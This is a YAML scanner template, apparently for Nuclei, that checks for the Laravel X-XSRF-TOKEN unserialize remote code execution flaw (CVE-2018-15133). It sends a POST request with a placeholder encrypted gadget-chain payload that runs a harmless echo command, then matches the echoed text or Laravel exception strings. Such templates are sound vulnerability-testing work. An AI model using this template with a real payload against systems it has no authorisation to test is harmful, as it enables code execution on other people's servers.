id: CVE-2018-15133

info:
  name: Laravel Framework <= 5.6.29 - X-XSRF-TOKEN Unserialize RCE (CVE-2018-15133)
  author: D3nverNg
  severity: high
  description: |
    Laravel Framework versions 5.5.40 and 5.6.x through 5.6.29 contain a remote code execution caused by unserialize call on untrusted X-XSRF-TOKEN value in Encrypter.php and phpggc gadgetchains, letting attackers with prior access execute arbitrary code, exploit requires attacker to know the application key.
  reference:
    - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/http/laravel_token_unserialize_exec.rb
    - http://packetstormsecurity.com/files/153641/PHP-Laravel-Framework-Token-Unserialize-Remote-Command-Execution.html
    - https://github.com/kozmic/laravel-poc-CVE-2018-15133
  metadata:
    kev: true
    verified: false
    shodan-query: cpe:"cpe:2.3:a:laravel:laravel"
  tags: laravel,rce,deserialization,php,cve,cve2018,kev

variables:
  # Base64 encoded APP_KEY (without "base64:")
  app_key: "{{app_key}}"

  # Command executed on target
  cmd: "echo CVE-2018-15133"

  # Pre-generated encrypted payload using phpggc + AES-256-CBC
  # Generated externally using Laravel APP_KEY
  payload: "{{payload}}"

http:
  - raw:
      - |
        POST /index.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        X-XSRF-TOKEN: {{payload}}
        Cookie: XSRF-TOKEN={{payload}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 500

      - type: word
        part: body
        words:
          - "CVE-2018-15133"

      - type: word
        part: body
        words:
          - "Illuminate"
          - "DecryptException"
